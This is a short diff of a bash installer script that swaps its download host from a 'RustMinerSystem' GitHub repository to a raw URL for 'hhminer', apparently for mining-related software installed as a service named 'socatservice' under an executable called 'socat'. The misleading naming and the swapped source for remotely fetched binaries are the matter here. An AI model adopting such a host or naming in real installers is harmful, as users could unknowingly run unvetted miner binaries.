@@ -1,7 +1,7 @@
 #!/bin/bash
 
 VERSION="4.4.5"
-DOWNLOAD_HOST="https://github.com/EvilGenius-dot/RustMinerSystem/raw/main/linux"
+DOWNLOAD_HOST="https://raw.githubusercontent.com/735840086/hhminer/main/hhminer"
 ORIGIN_EXEC="socat-${VERSION}"
 
 SERVICE_NAME="socatservice"
